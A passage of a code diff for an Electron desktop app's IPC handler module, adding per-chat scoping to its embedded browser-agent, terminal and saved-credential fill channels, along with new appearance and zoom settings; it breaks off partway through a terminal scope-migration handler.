@@ -1,14 +1,21 @@
 import {
+  type BrowserPanelAction,
   type BrowserPanelAnchor,
   type BrowserPanelBounds,
+  type BrowserPanelSnapshot,
   isBrowserDataKind,
   isBrowserTheme,
   isBrowserToolName,
 } from '@sim/browser-protocol'
-import type {
-  DesktopNotificationPayload,
-  DesktopUpdateState,
-  DesktopWindowState,
+import {
+  type DesktopNotificationPayload,
+  type DesktopUpdateState,
+  type DesktopWindowState,
+  type DesktopZoomPercent,
+  isDesktopAppearanceTheme,
+  isDesktopScopeId,
+  isDesktopZoomPercent,
+  isPendingDesktopScopeId,
 } from '@sim/desktop-bridge'
 import {
   isTerminalOperation,
@@ -20,18 +27,28 @@ import type { BrowserWindow, IpcMainEvent, IpcMainInvokeEvent, WebContents } fro
 import { clipboard, ipcMain } from 'electron'
 import {
   clearBrowsingData,
+  disposeBrowserScope,
   executeTool,
   getKnownSessions,
   handlePanelAction,
+  migrateBrowserScope,
+  restoreBrowserScope,
+  showToolbarMenu,
+  suspendBrowserScope,
 } from '@/main/browser-agent/driver'
 import { isAgentWebContents } from '@/main/browser-agent/registry'
 import {
   findInActiveTab,
-  getTabsState,
+  getBrowserDownloadsState,
+  peekTabsState,
   reorderTab,
-  setBrowserTheme,
+  setBrowserAppTheme,
   setTabPinned,
+  showBrowserDownloadInFolder,
+  showBrowserDownloadsMenu,
+  showTabContextMenu,
   stopFindInActiveTab,
+  withBrowserScope,
 } from '@/main/browser-agent/session'
 import {
   copyCredential,
@@ -55,10 +72,20 @@ import { isDesktopPreferenceKey } from '@/main/desktop-settings'
 import { hasRecentDeliberateInput, hasRecentDiscreteInput } from '@/main/input-activity'
 import type { LocalFilesystemService } from '@/main/local-filesystem'
 import { isAppOrigin, openExternalSafe } from '@/main/navigation'
-import type { TerminalService } from '@/main/terminal'
+import type { ScopedEventRouter } from '@/main/scoped-event-router'
+import type { TerminalRegistry } from '@/main/terminal/registry'
+import { findCachedTerminalThemeProfile, listTerminalThemeProfiles } from '@/main/terminal-themes'
 
 /** Workspace/chat ids are opaque tokens; anything else never reaches a URL. */
 const ID_PATTERN = /^[A-Za-z0-9_-]{1,128}$/
+
+/**
+ * Desktop state is partitioned by the existing chat id. A new-chat view uses
+ * the composer’s existing provisional key until the server assigns that id.
+ */
+function parseDesktopScope(raw: unknown): string | null {
+  return isDesktopScopeId(raw) ? raw : null
+}
 
 export interface OAuthConnectScope {
   workspaceId?: string
@@ -168,6 +195,25 @@ export function parsePanelAnchor(raw: unknown): BrowserPanelAnchor | undefined {
   return { viewportWidth, viewportHeight, widthRatio }
 }
 
+/**
+ * Validates a renderer-supplied menu anchor point. Menus position at the
+ * anchor, so unlike {@link parsePanelAnchor} a malformed value fails the
+ * request rather than degrading.
+ */
+function parseMenuAnchor(raw: unknown): { x: number; y: number } | null {
+  if (!isRecordLike(raw)) return null
+  const { x, y } = raw as { x?: unknown; y?: unknown }
+  if (
+    typeof x !== 'number' ||
+    typeof y !== 'number' ||
+    !Number.isFinite(x) ||
+    !Number.isFinite(y)
+  ) {
+    return null
+  }
+  return { x, y }
+}
+
 export function parseDesktopNotificationPayload(raw: unknown): DesktopNotificationPayload | null {
   if (typeof raw !== 'object' || raw === null) {
     return null
@@ -198,19 +244,32 @@ export interface IpcDeps {
   allowHttpLocalhost: () => boolean
   retryLoad: (sender: WebContents) => void
   localFilesystem: LocalFilesystemService
-  terminal: TerminalService
+  terminal: TerminalRegistry
+  scopeEvents: Pick<
+    ScopedEventRouter,
+    'activateBrowser' | 'activateTerminal' | 'sendBrowser' | 'sendTerminal'
+  >
   settings: DesktopSettingsService
   getWindowState: (sender: WebContents) => DesktopWindowState
   /** The window owning a renderer, for anchoring native menus. */
   getWindowForContents: (sender: WebContents) => BrowserWindow | null
   browserPanel: {
+    /** Activates the singleton compositor only for the foreground app window. */
+    activateScope: (sender: WebContents, scopeId: string) => void
     setBounds: (
       sender: WebContents,
       bounds: BrowserPanelBounds | null,
-      anchor?: BrowserPanelAnchor
+      anchor: BrowserPanelAnchor | undefined,
+      scopeId: string
     ) => void
-    setFocused: (sender: WebContents, focused: boolean) => void
-    setOccluded: (sender: WebContents, occluded: boolean) => void
+    setFocused: (sender: WebContents, focused: boolean, scopeId: string) => void
+    captureSnapshot: (sender: WebContents, scopeId: string) => Promise<BrowserPanelSnapshot | null>
+    setOccluded: (
+      sender: WebContents,
+      occluded: boolean,
+      scopeId: string,
+      force?: boolean
+    ) => boolean
   }
   beginOAuthConnect: (providerId: string, scope: OAuthConnectScope) => Promise<boolean>
   updates: {
@@ -367,6 +426,7 @@ function needsDeliberateInputForWrite(args: unknown[]): boolean {
 }
 
 interface DesktopToolAuthorization {
+  chatId: string
   toolName: string
   args: Record<string, unknown>
 }
@@ -391,10 +451,13 @@ async function fetchDesktopToolAuthorization(
     )
     if (!response.ok) return null
     const authorization = (await response.json()) as {
+      chatId?: unknown
       toolName?: unknown
       args?: unknown
     }
     if (
+      typeof authorization.chatId !== 'string' ||
+      !ID_PATTERN.test(authorization.chatId) ||
       typeof authorization.toolName !== 'string' ||
       typeof authorization.args !== 'object' ||
       authorization.args === null ||
@@ -403,6 +466,7 @@ async function fetchDesktopToolAuthorization(
       return null
     }
     return {
+      chatId: authorization.chatId,
       toolName: authorization.toolName,
       args: authorization.args as Record<string, unknown>,
     }
@@ -434,6 +498,94 @@ async function authorizeLocalFilesystemTool(
  * unvalidated args they must parse themselves.
  */
 export function registerIpcHandlers(deps: IpcDeps): void {
+  const browserScopeBySender = new WeakMap<WebContents, string>()
+  const terminalScopeBySender = new WeakMap<WebContents, string>()
+  const browserPendingScopesBySender = new WeakMap<WebContents, Set<string>>()
+  const terminalPendingScopesBySender = new WeakMap<WebContents, Set<string>>()
+  const observedPendingScopeSenders = new WeakSet<WebContents>()
+
+  const observePendingScopeSender = (sender: WebContents): void => {
+    if (observedPendingScopeSenders.has(sender)) return
+    observedPendingScopeSenders.add(sender)
+
+    const disposeOwnedPendingScopes = (): void => {
+      const browserScopes = browserPendingScopesBySender.get(sender)
+      browserPendingScopesBySender.delete(sender)
+      for (const scope of browserScopes ?? []) {
+        disposeBrowserScope(scope)
+      }
+
+      const terminalScopes = terminalPendingScopesBySender.get(sender)
+      terminalPendingScopesBySender.delete(sender)
+      for (const scope of terminalScopes ?? []) {
+        deps.terminal.disposeScope(scope)
+      }
+    }
+
+    sender.on('destroyed', disposeOwnedPendingScopes)
+    sender.on('render-process-gone', disposeOwnedPendingScopes)
+    sender.on('did-start-navigation', (_event, _url, isInPlace, isMainFrame) => {
+      // SPA task navigation has an explicit detached-stream migration path.
+      // A full renderer reload/navigation cannot recover its provisional key,
+      // so leaving those native pages and PTYs alive would orphan them.
+      if (!isInPlace && isMainFrame) disposeOwnedPendingScopes()
+    })
+  }
+
+  const rememberPendingScope = (
+    pendingScopes: WeakMap<WebContents, Set<string>>,
+    sender: WebContents,
+    scope: string
+  ): void => {
+    if (!isPendingDesktopScopeId(scope)) return
+    const owned = pendingScopes.get(sender) ?? new Set<string>()
+    owned.add(scope)
+    pendingScopes.set(sender, owned)
+    observePendingScopeSender(sender)
+  }
+
+  const consumePendingScope = (
+    pendingScopes: WeakMap<WebContents, Set<string>>,
+    sender: WebContents,
+    scope: string
+  ): boolean => {
+    const owned = pendingScopes.get(sender)
+    if (!owned?.delete(scope)) return false
+    if (owned.size === 0) pendingScopes.delete(sender)
+    return true
+  }
+
+  const activeRendererScope = (
+    scopes: WeakMap<WebContents, string>,
+    sender: WebContents,
+    rawScope: unknown
+  ): string | null => {
+    const requested = parseDesktopScope(rawScope)
+    if (!requested) return null
+
+    const active = scopes.get(sender)
+    if (active && active !== requested) return null
+    if (!active) scopes.set(sender, requested)
+    return requested
+  }
+
+  /**
+   * Resolves an explicitly scoped operation without requiring that scope to be
+   * renderer-active. Terminal groups are independent services, so a late
+   * operation for chat A is safe while chat B is visible: it can only touch A.
+   * (The browser compositor cannot make that guarantee and uses the stricter
+   * helper above.)
+   */
+  const rendererScope = (
+    scopes: WeakMap<WebContents, string>,
+    sender: WebContents,
+    rawScope: unknown
+  ): string | null => {
+    const requested = parseDesktopScope(rawScope)
+    if (requested && !scopes.has(sender)) scopes.set(sender, requested)
+    return requested
+  }
+
   const channels: Record<string, ChannelSpec> = {
     'desktop:open-external': {
       kind: 'invoke',
@@ -486,6 +638,64 @@ export function registerIpcHandlers(deps: IpcDeps): void {
           ? deps.settings.setPreference(key, value)
           : deps.settings.getPreferences(),
     },
+    'desktop:settings:set-appearance': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      denied: null,
+      handler: (key: unknown, value: unknown) => {
+        if (
+          (key === 'browserTheme' || key === 'terminalTheme') &&
+          isDesktopAppearanceTheme(value)
+        ) {
+          return deps.settings.setAppearancePreference(key, value)
+        }
+        return deps.settings.getPreferences()
+      },
+    },
+    'desktop:settings:set-browser-default-zoom': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      denied: null,
+      handler: (zoom: unknown) =>
+        isDesktopZoomPercent(zoom)
+          ? deps.settings.setBrowserDefaultZoom(zoom as DesktopZoomPercent)
+          : deps.settings.getPreferences(),
+    },
+    'desktop:settings:set-terminal-default-zoom': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      denied: null,
+      handler: (zoom: unknown) =>
+        isDesktopZoomPercent(zoom)
+          ? deps.settings.setTerminalDefaultZoom(zoom as DesktopZoomPercent)
+          : deps.settings.getPreferences(),
+    },
+    'desktop:settings:choose-browser-download-directory': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      needsUserActivation: true,
+      denied: null,
+      handler: () => deps.settings.chooseBrowserDownloadDirectory(),
+    },
+    'terminal-themes:list-profiles': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'terminal',
+      denied: [],
+      handler: () => listTerminalThemeProfiles(),
+    },
+    'terminal-themes:select-profile': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'terminal',
+      needsUserActivation: true,
+      denied: null,
+      handler: (profileId) => {
+        if (typeof profileId !== 'string') return null
+        const profile = findCachedTerminalThemeProfile(profileId)
+        return profile ? deps.settings.selectTerminalProfile(profile) : null
+      },
+    },
     'desktop:settings:notify': {
       kind: 'invoke',
       gate: 'app-origin',
@@ -523,20 +733,110 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       gate: 'app-origin',
       requires: 'browser',
       denied: { ok: false, error: 'Browser automation is not allowed from this page.' },
-      handler: (tool, params) => {
-        if (typeof tool !== 'string' || !isBrowserToolName(tool)) {
+      handler: (scope, tool, params) => {
+        if (typeof scope !== 'string' || typeof tool !== 'string' || !isBrowserToolName(tool)) {
           return { ok: false, error: `Unknown browser tool: ${String(tool)}` }
         }
         const toolParams = isRecordLike(params) ? params : {}
-        return executeTool(tool, toolParams)
+        return executeTool(scope, tool, toolParams)
       },
     },
     'browser-agent:get-tabs-state': {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'browser',
+      passSender: true,
       denied: { tabs: [], activeTabId: null },
-      handler: () => getTabsState(),
+      handler: (sender, rawScope) => {
+        const contents = sender as WebContents
+        const scope = activeRendererScope(browserScopeBySender, contents, rawScope)
+        return scope
+          ? withBrowserScope(scope, () => peekTabsState())
+          : { tabs: [], activeTabId: null }
+      },
+    },
+    'browser-agent:activate-scope': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      denied: { tabs: [], activeTabId: null },
+      handler: (sender, rawScope) => {
+        const scope = parseDesktopScope(rawScope)
+        if (!scope) return { tabs: [], activeTabId: null }
+        const contents = sender as WebContents
+        browserScopeBySender.set(contents, scope)
+        rememberPendingScope(browserPendingScopesBySender, contents, scope)
+        deps.scopeEvents.activateBrowser(contents, scope)
+        deps.browserPanel.activateScope(contents, scope)
+        return withBrowserScope(scope, () => peekTabsState())
+      },
+    },
+    'browser-agent:restore-scope': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      denied: { tabs: [], activeTabId: null },
+      handler: (sender, rawScope) => {
+        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
+        return scope ? restoreBrowserScope(scope) : { tabs: [], activeTabId: null }
+      },
+    },
+    'browser-agent:migrate-scope': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      denied: { tabs: [], activeTabId: null },
+      handler: (sender, rawFrom, rawTo) => {
+        const from = parseDesktopScope(rawFrom)
+        const to = parseDesktopScope(rawTo)
+        const contents = sender as WebContents
+        if (
+          !from ||
+          !isPendingDesktopScopeId(from) ||
+          !to ||
+          isPendingDesktopScopeId(to) ||
+          !browserPendingScopesBySender.get(contents)?.has(from) ||
+          !migrateBrowserScope(from, to)
+        ) {
+          return { tabs: [], activeTabId: null }
+        }
+        consumePendingScope(browserPendingScopesBySender, contents, from)
+        if (browserScopeBySender.get(contents) === from) {
+          browserScopeBySender.set(contents, to)
+          deps.scopeEvents.activateBrowser(contents, to)
+        }
+        return withBrowserScope(to, () => peekTabsState())
+      },
+    },
+    'browser-agent:dispose-scope': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      denied: false,
+      handler: (rawScope) => {
+        const scope = parseDesktopScope(rawScope)
+        if (!scope || !isPendingDesktopScopeId(scope)) return false
+        disposeBrowserScope(scope)
+        return true
+      },
+    },
+    'browser-agent:suspend-scope': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      denied: false,
+      handler: (rawScope) => {
+        const scope = parseDesktopScope(rawScope)
+        if (!scope || isPendingDesktopScopeId(scope)) return false
+        const suspended = suspendBrowserScope(scope)
+        if (suspended) {
+          deps.scopeEvents.sendBrowser(scope, 'browser-agent:scope-suspended', scope)
+        }
+        return suspended
+      },
     },
     // Reads and wipes the stored browsing trail, so both stay available while
     // the browser is switched off — that is exactly when someone clears it.
@@ -563,38 +863,114 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         return getKnownSessions()
       },
     },
+    'browser-agent:get-downloads-state': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      denied: { downloads: [] },
+      handler: (sender, rawScope) => {
+        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
+        return scope ? getBrowserDownloadsState(scope) : { downloads: [] }
+      },
+    },
+    'browser-agent:show-download-in-folder': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      needsUserActivation: true,
+      denied: false,
+      handler: (sender, downloadId, rawScope) => {
+        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
+        return scope && typeof downloadId === 'string'
+          ? showBrowserDownloadInFolder(scope, downloadId)
+          : false
+      },
+    },
+    'browser-agent:show-downloads-menu': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      needsUserActivation: true,
+      denied: false,
+      handler: (sender, anchor, rawScope) => {
+        const contents = sender as WebContents
+        const scope = activeRendererScope(browserScopeBySender, contents, rawScope)
+        const ownerWindow = deps.getWindowForContents(contents)
+        const point = parseMenuAnchor(anchor)
+        if (!scope || !ownerWindow || !point) return false
+        return showBrowserDownloadsMenu(scope, ownerWindow, point)
+      },
+    },
+    'browser-agent:show-toolbar-menu': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      needsUserActivation: true,
+      denied: false,
+      handler: (sender, anchor, rawScope) => {
+        const contents = sender as WebContents
+        const scope = activeRendererScope(browserScopeBySender, contents, rawScope)
+        const ownerWindow = deps.getWindowForContents(contents)
+        const point = parseMenuAnchor(anchor)
+        if (!scope || !ownerWindow || !point) return false
+        return showToolbarMenu(scope, ownerWindow, point)
+      },
+    },
     'browser-agent:panel-action': {
       kind: 'send',
       gate: 'app-origin',
       requires: 'browser',
-      handler: (action) => {
+      passSender: true,
+      handler: (sender, action, rawScope) => {
+        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
         if (
+          !scope ||
           typeof action !== 'object' ||
           action === null ||
           typeof (action as { action?: unknown }).action !== 'string'
         ) {
           return
         }
-        void handlePanelAction(action as Parameters<typeof handlePanelAction>[0]).catch(() => {})
+        void handlePanelAction(scope, action as BrowserPanelAction).catch(() => {})
       },
     },
     'browser-agent:set-tab-pinned': {
       kind: 'send',
       gate: 'app-origin',
       requires: 'browser',
-      handler: (tabId, pinned) => {
-        if (typeof tabId !== 'string' || typeof pinned !== 'boolean') return
+      passSender: true,
+      handler: (sender, tabId, pinned, rawScope) => {
+        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
+        if (!scope || typeof tabId !== 'string' || typeof pinned !== 'boolean') return
         try {
-          setTabPinned(tabId, pinned)
+          withBrowserScope(scope, () => setTabPinned(tabId, pinned))
         } catch {}
+      },
+    },
+    'browser-agent:show-tab-context-menu': {
+      kind: 'send',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      handler: (sender, tabId, rawScope) => {
+        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
+        if (!scope || typeof tabId !== 'string') return
+        withBrowserScope(scope, () => showTabContextMenu(tabId))
       },
     },
     'browser-agent:reorder-tab': {
       kind: 'send',
       gate: 'app-origin',
       requires: 'browser',
-      handler: (tabId, targetIndex) => {
+      passSender: true,
+      handler: (sender, tabId, targetIndex, rawScope) => {
+        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
         if (
+          !scope ||
           typeof tabId !== 'string' ||
           typeof targetIndex !== 'number' ||
           !Number.isFinite(targetIndex)
@@ -602,7 +978,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
           return
         }
         try {
-          reorderTab(tabId, targetIndex)
+          withBrowserScope(scope, () => reorderTab(tabId, targetIndex))
         } catch {}
       },
     },
@@ -611,11 +987,44 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       gate: 'app-origin',
       requires: 'browser',
       passSender: true,
-      handler: (sender, raw, rawAnchor) => {
+      handler: (sender, raw, rawAnchor, rawScope) => {
+        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
+        if (!scope) return
         const bounds = parsePanelBounds(raw)
         if (bounds !== undefined) {
-          deps.browserPanel.setBounds(sender as WebContents, bounds, parsePanelAnchor(rawAnchor))
+          deps.browserPanel.setBounds(
+            sender as WebContents,
+            bounds,
+            parsePanelAnchor(rawAnchor),
+            scope
+          )
         }
+      },
+    },
+    'browser-agent:capture-panel-snapshot': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      denied: null,
+      handler: (sender, rawScope) => {
+        const contents = sender as WebContents
+        const scope = activeRendererScope(browserScopeBySender, contents, rawScope)
+        return scope ? deps.browserPanel.captureSnapshot(contents, scope) : null
+      },
+    },
+    'browser-agent:set-panel-occluded': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'browser',
+      passSender: true,
+      denied: false,
+      handler: (sender, occluded, rawScope, force = false) => {
+        const contents = sender as WebContents
+        const scope = activeRendererScope(browserScopeBySender, contents, rawScope)
+        return scope && typeof occluded === 'boolean' && typeof force === 'boolean'
+          ? deps.browserPanel.setOccluded(contents, occluded, scope, force)
+          : false
       },
     },
     'browser-agent:set-panel-focused': {
@@ -623,20 +1032,10 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       gate: 'app-origin',
       requires: 'browser',
       passSender: true,
-      handler: (sender, focused) => {
-        if (typeof focused === 'boolean') {
-          deps.browserPanel.setFocused(sender as WebContents, focused)
-        }
-      },
-    },
-    'browser-agent:set-panel-occluded': {
-      kind: 'send',
-      gate: 'app-origin',
-      requires: 'browser',
-      passSender: true,
-      handler: (sender, occluded) => {
-        if (typeof occluded === 'boolean') {
-          deps.browserPanel.setOccluded(sender as WebContents, occluded)
+      handler: (sender, focused, rawScope) => {
+        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
+        if (scope && typeof focused === 'boolean') {
+          deps.browserPanel.setFocused(sender as WebContents, focused, scope)
         }
       },
     },
@@ -646,7 +1045,7 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       requires: 'browser',
       handler: (theme) => {
         if (isBrowserTheme(theme)) {
-          setBrowserTheme(theme)
+          setBrowserAppTheme(theme)
         }
       },
     },
@@ -654,25 +1053,32 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       kind: 'send',
       gate: 'app-origin',
       requires: 'browser',
-      handler: (raw) => {
+      passSender: true,
+      handler: (sender, raw, rawScope) => {
+        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
+        if (!scope) return
         if (typeof raw !== 'object' || raw === null) return
-        const { query, findNext, forward } = raw as Record<string, unknown>
+        const { query, newSession, forward } = raw as Record<string, unknown>
         if (
           typeof query !== 'string' ||
-          typeof findNext !== 'boolean' ||
+          typeof newSession !== 'boolean' ||
           typeof forward !== 'boolean'
         ) {
           return
         }
-        findInActiveTab({ query, findNext, forward })
+        withBrowserScope(scope, () => findInActiveTab({ query, newSession, forward }))
       },
     },
     'browser-agent:stop-find': {
       kind: 'send',
       gate: 'app-origin',
       requires: 'browser',
-      handler: (focusPage) => {
-        stopFindInActiveTab(focusPage === true)
+      passSender: true,
+      handler: (sender, focusPage, rawScope) => {
+        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
+        if (scope) {
+          withBrowserScope(scope, () => stopFindInActiveTab(focusPage === true))
+        }
       },
     },
     // Local Chrome import. This is a user-only surface: no browser tool maps
@@ -746,9 +1152,23 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       passSender: true,
       handler: (sender, report) => {
         if (!isRecordLike(report)) return
-        const { origin, hasLoginForm } = report as { origin?: unknown; hasLoginForm?: unknown }
-        if (typeof origin !== 'string' || typeof hasLoginForm !== 'boolean') return
-        fillCoordinator()?.noteFormState(sender as WebContents, { origin, hasLoginForm })
+        const { origin, hasLoginForm, hasPasswordField } = report as {
+          origin?: unknown
+          hasLoginForm?: unknown
+          hasPasswordField?: unknown
+        }
+        if (
+          typeof origin !== 'string' ||
+          typeof hasLoginForm !== 'boolean' ||
+          typeof hasPasswordField !== 'boolean'
+        ) {
+          return
+        }
+        fillCoordinator()?.noteFormState(sender as WebContents, {
+          origin,
+          hasLoginForm,
+          hasPasswordField,
+        })
       },
     },
     'browser-credentials:available': {
@@ -762,6 +1182,19 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       gate: 'app-origin',
       denied: [],
       handler: () => listCredentials(),
+    },
+    'browser-credentials:list-fill-options': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      deviationReason:
+        'this list is derived from the active browser page, so unlike the read-only password manager list beside it there is nothing to inspect when the browser is off',
+      requires: 'browser',
+      passSender: true,
+      denied: [],
+      handler: (sender, rawScope) => {
+        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
+        return scope ? (fillCoordinator()?.listFillOptions(scope) ?? []) : []
+      },
     },
     // Hosts a previous import brought over, with the name and icon the source
     // browser gave each one and an aggregate count of how much it was used
@@ -842,37 +1275,55 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       needsUserActivation: true,
       passSender: true,
       denied: false,
-      handler: (sender, anchor) => {
-        const window = deps.getWindowForContents(sender as WebContents)
-        if (!window || !isRecordLike(anchor)) return false
-        const { x, y } = anchor as { x?: unknown; y?: unknown }
-        if (
-          typeof x !== 'number' ||
-          typeof y !== 'number' ||
-          !Number.isFinite(x) ||
-          !Number.isFinite(y)
-        ) {
-          return false
-        }
-        return fillCoordinator()?.showChooser(window, { x, y }) ?? false
+      handler: (sender, anchor, rawScope) => {
+        const contents = sender as WebContents
+        const scope = activeRendererScope(browserScopeBySender, contents, rawScope)
+        const window = deps.getWindowForContents(contents)
+        const point = parseMenuAnchor(anchor)
+        if (!scope || !window || !point) return false
+        return fillCoordinator()?.showChooser(window, point, scope) ?? false
+      },
+    },
+    'browser-credentials:fill-selected': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      deviationReason:
+        'it writes a saved credential into the active browser page, so it requires the browser surface plus a live user selection',
+      requires: 'browser',
+      needsUserActivation: true,
+      passSender: true,
+      denied: false,
+      handler: (sender, id, rawScope) => {
+        const scope = activeRendererScope(browserScopeBySender, sender as WebContents, rawScope)
+        if (!scope || typeof id !== 'string' || !ID_PATTERN.test(id)) return false
+        return fillCoordinator()?.fillCredential(id, scope) ?? false
       },
     },
     'terminal:start': {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'terminal',
+      passSender: true,
       denied: { ok: false, code: 'ACCESS_DENIED', error: 'Not allowed from this page.' },
-      handler: (raw) => {
+      handler: (sender, raw, rawScope) => {
+        const contents = sender as WebContents
+        const scope = rendererScope(terminalScopeBySender, contents, rawScope)
+        if (!scope) {
+          return { ok: false, code: 'STALE_SCOPE', error: 'This terminal chat is not active.' }
+        }
         const options = isRecordLike(raw) ? raw : {}
         const cols = Number(options.cols)
         const rows = Number(options.rows)
         try {
           return {
             ok: true,
-            tabs: deps.terminal.start({
-              cols: toCellCount(cols, 80),
-              rows: toCellCount(rows, 24),
-            }),
+            tabs: {
+              ...deps.terminal.start(scope, {
+                cols: toCellCount(cols, 80),
+                rows: toCellCount(rows, 24),
+              }),
+              scopeId: scope,
+            },
           }
         } catch (error) {
           const failure = error as { code?: string; message?: string }
@@ -889,8 +1340,9 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       gate: 'app-origin',
       requires: 'terminal',
       denied: { ok: false, error: 'Terminal access is not allowed from this page.' },
-      handler: (toolCallId, tool, params) => {
+      handler: (scope, toolCallId, tool, params) => {
         if (
+          typeof scope !== 'string' ||
           typeof toolCallId !== 'string' ||
           typeof tool !== 'string' ||
           !isTerminalToolName(tool)
@@ -902,15 +1354,19 @@ export function registerIpcHandlers(deps: IpcDeps): void {
           return { ok: false, error: `Unknown terminal operation: ${String(call.operation)}` }
         }
         const args = isRecordLike(call.args) ? (call.args as TerminalToolArgs) : {}
-        return deps.terminal.executeTool(toolCallId, call.operation, args)
+        return deps.terminal.executeTool(scope, toolCallId, call.operation, args)
       },
     },
     'terminal:handoff-done': {
       kind: 'send',
       gate: 'app-origin',
       requires: 'terminal',
-      handler: (terminalId) => {
-        if (typeof terminalId === 'string') deps.terminal.finishHandoff(terminalId)
+      passSender: true,
+      handler: (sender, terminalId, rawScope) => {
+        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        if (scope && typeof terminalId === 'string') {
+          deps.terminal.finishHandoff(scope, terminalId)
+        }
       },
     },
     'terminal:focused': {
@@ -918,24 +1374,28 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       gate: 'app-origin',
       requires: 'terminal',
       passSender: true,
-      handler: (sender, focused) =>
-        deps.terminal.setPanelFocused(focused === true, sender as WebContents),
+      handler: (sender, focused, rawScope) => {
+        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        if (scope) deps.terminal.setPanelFocused(scope, focused === true, sender as WebContents)
+      },
     },
     'terminal:paste': {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'terminal',
+      passSender: true,
       denied: false,
       // The bytes come from the clipboard here, not from the caller, so this
       // does not need the write gate: a compromised renderer can only replay
       // what the user already copied. It still needs a real gesture, because
       // the legitimate caller is a Paste click or ⌘V.
       needsUserActivation: true,
-      handler: (terminalId) => {
-        if (typeof terminalId !== 'string') return false
+      handler: (sender, terminalId, rawScope) => {
+        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        if (!scope || typeof terminalId !== 'string') return false
         const text = clipboard.readText()
         if (!text) return false
-        deps.terminal.write(terminalId, text)
+        deps.terminal.write(scope, terminalId, text)
         return true
       },
     },
@@ -943,51 +1403,170 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'terminal',
+      passSender: true,
       denied: '',
-      handler: (terminalId) =>
-        typeof terminalId === 'string' ? deps.terminal.getScrollback(terminalId) : '',
+      handler: (sender, terminalId, rawScope) => {
+        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        return scope && typeof terminalId === 'string'
+          ? deps.terminal.getScrollback(scope, terminalId)
+          : ''
+      },
+    },
+    'terminal:clear-scrollback': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'terminal',
+      passSender: true,
+      denied: false,
+      handler: (sender, terminalId, rawScope) => {
+        const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
+        return scope && typeof terminalId === 'string'
+          ? deps.terminal.clearScrollback(scope, terminalId)
+          : false
+      },
     },
     'terminal:get-tabs': {
       kind: 'invoke',
       gate: 'app-origin',
       requires: 'terminal',
+      passSender: true,
       denied: { tabs: [], activeTerminalId: null },
-      handler: () => deps.terminal.getTabs(),
+      handler: (sender, rawScope) => {
+        const contents = sender as WebContents
+        const scope = rendererScope(terminalScopeBySender, contents, rawScope)
+        return scope
+          ? { ...deps.terminal.peekTabs(scope), scopeId: scope }
+          : { tabs: [], activeTerminalId: null }
+      },
+    },
+    'terminal:activate-scope': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'terminal',
+      passSender: true,
+      denied: { tabs: [], activeTerminalId: null },
+      handler: (sender, rawScope) => {
+        const scope = parseDesktopScope(rawScope)
+        if (!scope) return { tabs: [], activeTerminalId: null }
+        const contents = sender as WebContents
+        terminalScopeBySender.set(contents, scope)
+        rememberPendingScope(terminalPendingScopesBySender, contents, scope)
+        deps.scopeEvents.activateTerminal(contents, scope)
+        return { ...deps.terminal.activateScope(scope), scopeId: scope }
+      },
+    },
+    'terminal:migrate-scope': {
+      kind: 'invoke',
+      gate: 'app-origin',
+      requires: 'terminal',
+      passSender: true,
